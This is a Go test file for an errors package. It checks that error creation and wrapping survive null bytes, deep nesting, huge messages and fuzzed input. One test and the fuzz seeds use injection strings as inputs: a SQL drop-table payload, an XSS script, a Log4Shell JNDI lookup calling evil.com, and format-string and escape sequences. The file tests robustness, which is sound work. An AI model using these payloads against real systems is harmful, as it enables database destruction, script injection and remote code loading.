package errors

import (
	"errors"
	"fmt"
	"strings"
	"testing"
)

// TestError_NullByteInMessage verifies that null bytes in error messages do not cause panics.
func TestError_NullByteInMessage(t *testing.T) {
	t.Parallel()
	err := New("message\x00with\x00nulls")
	if err == nil {
		t.Fatal("expected non-nil error")
	}
	msg := err.Error()
	if !strings.Contains(msg, "message") {
		t.Fatalf("expected message content, got: %s", msg)
	}
}

// TestError_DeepWrapping verifies that 1000 levels of wrapping do not panic or overflow.
func TestError_DeepWrapping(t *testing.T) {
	t.Parallel()
	base := fmt.Errorf("base")
	err := base
	for range 1000 {
		err = Wrap(err, "layer")
	}
	if err == nil {
		t.Fatal("expected non-nil error after deep wrapping")
	}
	if !errors.Is(err, base) {
		t.Fatal("errors.Is should find base error through 1000 layers")
	}
}

// TestError_EmptyMessage verifies that an empty message produces a valid error.
func TestError_EmptyMessage(t *testing.T) {
	t.Parallel()
	err := New("")
	if err == nil {
		t.Fatal("expected non-nil error for empty message")
	}
}

// TestError_LargeMessage verifies that a 10MB error message does not panic.
func TestError_LargeMessage(t *testing.T) {
	t.Parallel()
	large := strings.Repeat("x", 10*1024*1024)
	err := New(large)
	if err == nil {
		t.Fatal("expected non-nil error for large message")
	}
	if len(err.Error()) < 10*1024*1024 {
		t.Fatal("error message was truncated")
	}
}

// TestError_SpecialCharsInMessage verifies that SQL and HTML injection strings do not panic.
func TestError_SpecialCharsInMessage(t *testing.T) {
	t.Parallel()
	payloads := []string{
		"'; DROP TABLE users; --",
		`<script>alert("xss")</script>`,
		"${jndi:ldap://evil.com/a}",
		"%s%s%s%s%s%s%s%s%s%s",
		"\t\n\r\x00\x1b[31m",
	}
	for _, payload := range payloads {
		err := New(payload)
		if err == nil {
			t.Fatalf("expected non-nil error for payload: %q", payload)
		}
		// Wrap the injection string as well.
		wrapped := Wrap(err, "context: "+payload)
		if wrapped == nil {
			t.Fatalf("expected non-nil wrapped error for payload: %q", payload)
		}
	}
}

// FuzzErrorMessage fuzzes error creation and wrapping with arbitrary strings.
func FuzzErrorMessage(f *testing.F) {
	f.Add("simple")
	f.Add("")
	f.Add("\x00")
	f.Add(strings.Repeat("a", 10000))
	f.Add("'; DROP TABLE users; --")
	f.Add("%s %d %v")

	f.Fuzz(func(t *testing.T, msg string) {
		// Must not panic.
		err := New(msg)
		if err == nil {
			t.Fatal("New should never return nil")
		}
		_ = err.Error()

		base := fmt.Errorf("base")
		wrapped := Wrap(base, msg)
		if wrapped == nil {
			t.Fatal("Wrap should not return nil for non-nil error")
		}
		_ = wrapped.Error()

		formatted := Wrapf(base, "prefix: %s", msg)
		if formatted == nil {
			t.Fatal("Wrapf should not return nil for non-nil error")
		}
		_ = formatted.Error()
	})
}
